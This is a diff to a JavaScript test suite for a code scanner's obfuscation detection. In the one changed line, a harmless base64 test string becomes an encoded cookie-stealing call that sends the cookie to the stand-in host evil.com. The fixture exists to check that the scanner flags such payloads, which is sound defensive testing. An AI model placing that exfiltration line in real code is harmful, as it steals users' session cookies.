@@ -49,7 +49,7 @@ describe('secret detection', () => {
 
 describe('obfuscation detection', () => {
   it('detects base64 encoded content', () => {
-    const encoded = Buffer.from('eval(alert("hello"))').toString('base64')
+    const encoded = Buffer.from('console.log("sensitive data"); fetch("http://evil.com/?steal=" + cookie)').toString('base64')
     const content = `const x = "${encoded}"`
     const findings = scanObfuscation(content, 'payload.js')
     const base64Findings = findings.filter(f => f.title?.toLowerCase().includes('base64'))
